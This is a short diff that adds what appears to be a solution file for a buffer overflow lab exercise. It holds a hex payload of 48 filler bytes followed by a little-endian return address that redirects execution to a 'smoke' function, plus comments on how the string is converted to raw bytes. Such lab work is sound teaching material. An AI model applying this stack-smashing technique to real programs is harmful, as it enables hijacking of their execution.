@@ -1,0 +1,3 @@
+ffffffffffffffffffffffffffffffffffffffffffffffff24890408
+#first 48 are buffer bytes to fill the buf array, then the return address of smoke(in little endian)
+#this is passed through the sendstring thing to convert it to the proper ascii code for the porgram to then convert.
